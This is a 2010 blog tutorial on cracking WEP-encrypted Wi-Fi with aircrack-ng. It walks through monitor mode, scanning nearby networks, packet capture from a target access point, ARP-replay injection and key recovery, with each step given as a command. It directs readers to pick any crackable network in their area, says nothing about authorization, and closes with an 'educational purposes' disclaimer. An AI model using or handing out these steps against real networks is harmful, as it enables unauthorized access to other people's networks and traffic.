---
comments: true
date: 2010-06-18 18:37:17
layout: post
slug: simple-wep-cracking
title: Simple WEP Cracking
wordpress_id: 298
categories:
- Systemless
tags:
- cracking
- security
- WEP Cracking
---
### 1 Introduction


This tutorial will show you how to crack a depreciated, but still used, wireless encryption algorithm called Wired Equivalent Privacy (WEP).  WEP was introduced in 1997 and was designed to provide the user with a secure connection comparable to that of traditional wired networks.  But sometime in 2001 weaknesses where beginning to show and in 2004 WEP was declared depreciated due to the fact that it was unable to meet its security goals.


### 2 Implementation


This tutorial is written for users of Linux, you may be able to follow along using Microsoft Windows, make sure to check the aircrack-ng website.  (http://www.aircrack-ng)

This tutorial is written with the then current version of aircrack, 1.0.  Download and compile the aircrack tools or use you download manager, search aircrack-ng, it should be easy to do.  Once that is done check it is working by typing “aircrack-ng” you should have a output that looks something like this:

	osaka@Nyu:~$ aircrack-ng

	Aircrack-ng 1.0 rc3 – (C) 2006, 2007, 2008, 2009 Thomas d’Otreppe
	Original work: Christophe Devine
	http://www.aircrack-ng.org
	etc ..

There will be four scripts from aircrack-ng that you will be using:

	airmon-ng <start|stop|check> <interface> [channel or frequency]

Script used for switching the wireless network card to monitor mode

	airodump-ng <options> <interface>[,<interface>,...]

Script used for WLAN monitoring and capturing network packets

	aireplay-ng <options> <replay interface> 

Script used to generate additional traffic on the wireless network

	aircrack-ng [options <.cap /.ivs file(s)>

Script used to recover the WEP key, or launch a dictionary attack on WPA-PSK using the captured data.

You will need to know some basic Linux networking commands.

	iwconfig [-v] [-a] [-s] [interface]

This is a standard Linux command it will display the status of the currently active interfaces.  If a single interface is given it will display only that interfaces status.

	-v	Be more verbose for some error conditions
	-a	Displays all interfaces which are currently available, even if down
	-s	Displays a short list (like netstat -i)


### 2.1 Action
To start, we need to reconfigure the network interface to promiscuous mode, or more commonly known as monitoring mode.  Some interfaces do not support this mode, google your card and find this out. This could be a problem if you are having trouble, make sure your card has this feature.  To start your interface in monitor mode simply type:

	airmon-ng start <interface>

If it worked it will create an alias to your specified interface, we will be using wlan0. To make sure if this has worked you should run the ifconfig command.  If it did work then you will see mon0 in the list of interfaces.

Now that your interface is set up correctly, we can move on to the next step this is to locate a crackable network.  Run the following script and you will have a display of the networks in your area in real-time.

	airodump-ng mon0

The data being displayed is information about wireless networks in your area, some of the information displayed is - Basic Service Set Identifier (BSSID) – which is the Media Access Control (MAC) address of the wireless access point (WAP), network channel etc.  We need to know what kind of encryption the network is using, as this is an article on cracking WEP, we should look for any network with the WEP encryption.

Once you find a network with WEP encryption we need to collect the data packets that are on the network to do this run the following command:

	airodump-ng -c <channel> --bssid <BSSID> -w <output-file> mon0
	airodump-ng -c 6 --bssid 00:0F:CC:7D:5A:74 -w dataFile mon0

This will capture the data being transmitted over a network using out interface mon0 on channel six from the wireless access point with the BSSID of 00:0F:CC:7D:5A:74 and write it to a file called data.

	-c		Network channel
	--bssid		Basic Service Set Identifier MAC Adderess
	-w		Write captured packets to file “dataFile”
	mon0		Is the alias to the wlan0 in monitor mode

We will need to collect about 10,000 data packets before we will be able to crack the encryption.  It will take anywhere from 5 – 30min to get enough packets, this depends on how much the network is being used.  If it has a lot of traffic then more packets will be sent out.

Now if it late at night or there is not a lot of traffic, then we can use the following command to make the wireless access point transmit some packets:

	aireplay-ng -3 -b 00:0F:CC:7D:5A:74 -h 00:14:A5:2F:A7:DE -x 50 wlan0**
	-3	This specifies the type of attack, in our case ARP-request replay
	-b	MAC address of access point
	-h	MAC address of associated client from airodump
	-x 50	Limit to sending 50 packets per second
	wlan0 Our wireless network interface

Again this could cause problems if your interface dose not support injection. Give google another shout.

Once you have 10,000 – 20,000 data packets you are ready to give cracking it a shot.  Now you should have a few files created in your current directory from the previous script, these are the files which contain the data packets that you collected, run the following script to get the WEP Encryption Key.

	aircrack-ng dataFile*.cap

It will take its time and you will see some really cool data displayed on your screen, then once its complete it will give you the key in plain text.


### 3 Conclusion
So as we can see within 10min of good data transmission we are able to gather enough data packets to be able to crack the encryption.  To crack WPA and WPA2 the method is more or less the same, but with a slight difference and more time is required.  Despite  the fact that WEP is a depreciated algorithm it is still used in homes and other places across the world today.

Remember this is for educational purposes and I hold no responsibility for your actions.

### 4 References
[http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy](http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy)
Simple wiki article explaining what WEP is.

[http://www.aircrack-ng.org](http://www.aircrack-ng.org/)
Lots of nice and useful information about the aircrack-ng package.